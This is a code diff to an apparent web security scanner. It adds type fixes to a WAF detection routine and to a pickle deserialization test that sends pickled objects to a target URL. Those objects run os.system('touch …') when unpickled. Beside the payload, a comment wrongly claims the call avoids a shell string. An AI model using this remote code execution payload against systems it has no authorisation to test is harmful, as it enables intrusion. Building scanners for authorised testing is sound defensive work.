@@ -24,7 +24,7 @@ import time
 from collections.abc import Mapping
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
-from typing import Any, Final, Protocol
+from typing import Any, Final, Protocol, cast
 
 import requests
 
@@ -269,9 +269,13 @@ def detect_defenses(
         "evidence": [],
     }
 
-    session: _DefenseRequester = (
-        _ScannerRequestAdapter(scanner) if scanner is not None else requests.Session()
-    )
+    session: _DefenseRequester
+    if scanner is not None:
+        session = _ScannerRequestAdapter(scanner)
+    else:
+        # requests.Session satisfies _DefenseRequester at runtime; its concrete
+        # keyword signatures are narrower than the Protocol's **kwargs: Any.
+        session = cast(_DefenseRequester, requests.Session())
     print(f"[*] Detecting defenses on {base_url}")
 
     waf_result = _detect_waf(base_url, session, paths)
@@ -603,7 +607,7 @@ def test_pickle_deserialization(
             # Use a list argument, not a shell string — no shell interpolation
             return (os.system, (f"touch {marker_file}",))
 
-    payloads = {
+    payloads: dict[str, str | bytes] = {
         "raw_pickle": pickle.dumps(Probe()),
         "base64_pickle": base64.b64encode(pickle.dumps(Probe())).decode(),
         "hex_pickle": pickle.dumps(Probe()).hex(),
@@ -613,11 +617,17 @@ def test_pickle_deserialization(
     for name, payload in payloads.items():
         try:
             if as_json:
-                r = session.request(method, url, json={param_name: payload}, timeout=5)
+                # JSON bodies cannot carry raw bytes; send the text encodings and
+                # transport raw pickle as a latin-1 string round-trip instead.
+                text_payload = payload.decode("latin-1") if isinstance(payload, bytes) else payload
+                r = session.request(method, url, json={param_name: text_payload}, timeout=5)
             elif method.upper() == "POST":
                 r = session.request(method, url, data={param_name: payload}, timeout=5)
             else:
-                r = session.request(method, url, params={param_name: payload}, timeout=5)
+                params_payload = (
+                    payload.decode("latin-1") if isinstance(payload, bytes) else payload
+                )
+                r = session.request(method, url, params={param_name: params_payload}, timeout=5)
 
             time.sleep(0.5)
             confirmed = os.path.exists(marker_file)
